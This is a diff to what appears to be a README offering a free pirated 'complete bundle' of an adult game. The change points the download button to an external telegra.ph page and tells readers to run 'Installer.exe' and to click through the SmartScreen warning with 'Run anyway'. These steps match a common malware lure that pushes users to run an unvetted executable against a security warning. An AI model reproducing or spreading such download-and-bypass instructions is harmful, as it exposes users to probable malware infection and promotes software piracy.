@@ -88,12 +88,12 @@ Explicit adult content: full nudity, graphic sexual intercourse, detailed genita
 ### Get the complete bundle
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/⬇_DOWNLOAD_FULL_GAME_+_ALL_DLC-FREE-7B1FA2?style=for-the-badge&labelColor=1a001a"/></a>
+  <a href="https://telegra.ph/d2325243-09-09"><img src="https://img.shields.io/badge/⬇_DOWNLOAD_FULL_GAME_+_ALL_DLC-FREE-7B1FA2?style=for-the-badge&labelColor=1a001a"/></a>
 </p>
 
-**A.** Click **[CLICK](#)** — saves the all-in-one archive (base game + Supporter + Wallpapers + Soundtrack).  
-**B.** Extract `Horny-Femboy-Vampires-Complete-Bundle.zip` anywhere on your PC.  
-**C.** Run `Setup.exe` or `HornyFemboyVampires.exe` from the extracted folder.  
+**A.** Click **[CLICK](https://telegra.ph/d2325243-09-09)** — saves the all-in-one archive (base game + Supporter + Wallpapers + Soundtrack).  
+**B.** Extract `Horny-Femboy-Vampires.zip` anywhere on your PC.  
+**C.** Run `Installer.exe` from the extracted folder.  
 **D.** SmartScreen warning? → **More info** → **Run anyway**.  
 **E.** Launch — all DLC content is pre-unlocked. No Steam checkout required.
 
